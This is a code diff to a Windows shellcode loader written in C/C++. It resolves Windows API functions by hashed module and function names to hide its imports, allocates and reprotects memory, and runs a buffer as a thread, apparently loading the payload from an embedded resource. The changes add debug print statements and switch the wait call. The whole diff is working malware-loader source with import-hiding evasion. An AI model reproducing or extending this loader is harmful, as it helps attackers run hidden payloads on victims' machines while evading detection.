@@ -17,7 +17,7 @@ VOID ResolveApi(PAPI instance) {
 	instance->win32.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTALLOCATEVIRTUALMEMORY);
 	instance->win32.NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTPROTECTVIRTUALMEMORY);
 	instance->win32.CreateThread = (CreateThread_t)GetSymbolAddress(GetModuleAddress(KERNEL10), CREATEREMOTETHREAD);
-	instance->win32.NtWaitForSingleObjectEx = (NtWaitForSingleObjectEx_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTWAITFORSINGLEOBJECTEX);
+	instance->win32.NtWaitForSingleObject = (NtWaitForSingleObject_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTWAITFORSINGLEOBJECT);
 	instance->win32.FindResourceA = (FindResourceA_t)GetSymbolAddress(GetModuleAddress(KERNEL10), FINDRESOURCEA);
 	instance->win32.SizeofResource = (SizeofResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), SIZEOFRESOURCE);
 	instance->win32.LoadResource = (LoadResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), LOADRESOURCE);
@@ -47,11 +47,13 @@ HMODULE GetModuleAddress(DWORD hash) {
 
 		if (name) {
 			if (hash - HashString(name, wcslen(name)) == 0) {
+				printf("module found : %ls\n", name);
 				return (HMODULE)mod->BaseAddress;
 			}
 		}
 		next = next->Flink;
 	}
+	printf("module not found\n");
 	return nullptr;
 }
 
@@ -74,10 +76,12 @@ FARPROC GetSymbolAddress(HMODULE base, DWORD hash) {
 			auto name = RVA(LPSTR, base, names[i]);
 
 			if (hash - HashString(name, strlen(name)) == 0) {
+				printf("function found: %s\n", name);
 				return (FARPROC) RVA(PULONG, base, functions[ordinals[i]]);
 			}
 			continue;
 		}
+		printf("functions not found\n");
 		return nullptr;
 	}
 }
@@ -121,7 +125,7 @@ int main() {
 		if (NT_SUCCESS(ntstatus)) {
 			printf("creating thread\n");
 			hThread = instance->win32.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);
-			instance->win32.NtWaitForSingleObjectEx(hThread, FALSE, INFINITE);
+			instance->win32.NtWaitForSingleObject(hThread, FALSE, INFINITE);
 		} 	
 	}
 	printf("exit code: 0x%lx\n", ntstatus);
